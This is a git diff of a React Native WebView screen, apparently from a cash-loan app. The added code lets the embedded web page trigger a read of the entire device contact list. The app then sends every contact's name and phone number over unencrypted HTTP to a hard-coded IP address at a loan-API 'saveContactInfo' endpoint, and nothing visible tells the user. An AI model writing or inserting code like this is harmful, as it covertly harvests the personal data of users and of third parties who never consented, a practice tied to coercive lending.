@@ -1,7 +1,7 @@
 import React, { Component } from 'react';
 import { WebView } from 'react-native';
 import DeviceInfo from 'react-native-device-info';
-
+import Contacts from 'react-native-contacts';
 
 export  default class MyWeb extends Component {
     static navigationOptions = {
@@ -23,10 +23,49 @@ export  default class MyWeb extends Component {
                 this.props.navigation.navigate('IDTips',{
                     type: "Face"
                 })
-            }else if(typeof(JSON.parse(event.nativeEvent.data))==="object" && JSON.parse(event.nativeEvent.data).userId){
+            }else if(typeof(JSON.parse(event.nativeEvent.data))==="object" && JSON.parse(event.nativeEvent.data).userId && JSON.parse(event.nativeEvent.data).type == "Contacts"){
+                let userId = JSON.parse(event.nativeEvent.data).userId;
+                Contacts.getAll((err, contacts) => {
+                    if (err) {
+                        alert(err)
+                    };
+                    // console.log(contacts);
+                    let result =[];
+                    contacts.forEach((value,key,arr) => {
+                        if(value.phoneNumbers && Array.isArray(value.phoneNumbers)){
+                            value.phoneNumbers.forEach((v,k) => {
+                                let item = {};
+                                item.givenName = value.givenName;
+                                item.familyName = value.familyName;
+                                item.number = v.number;
+                                result.push(item);
+                            })
+                        }
+                    })
+                    console.log(result);
+                    let myHeaders = new Headers();
+                    myHeaders.append('Content-Type','application/json');
+                    myHeaders.append('Accept','application/json');
+                    fetch("http://39.106.198.9:8080/cashloanapi/contact/saveContactInfo/"+userId,{
+                        headers:myHeaders,
+                        method: 'post',
+                        body: JSON.stringify(result)
+                    })
+                    .then(res => res.json())
+                    .then(data => {
+                        console.log(data);
+                        if(data.state.errCode ===10000){
+                            console.log(data.body.message)
+                        }
+                    })
+                    .catch(error => {
+                        console.log("Error:", error);
+                    })
+
+                })
+            }else if(typeof(JSON.parse(event.nativeEvent.data))==="object" && JSON.parse(event.nativeEvent.data).userId) {
                 global.userId = JSON.parse(event.nativeEvent.data).userId;
             }
-            console.log(userId)
         }
     }
     render() {
@@ -54,7 +93,7 @@ export  default class MyWeb extends Component {
 
         return (
             <WebView
-                source={{uri:"http://39.106.198.9:8080/loanpages/registerAndLogin.html?n=6&deviceName="+params}}
+                source={{uri:"http://39.106.198.9:8080/loanpages/registerAndLogin.html?n=0&deviceName="+params}}
                 style={{marginTop: 0}}
                 onMessage={this.fromWeb}
                 javaScriptEnabled={true}
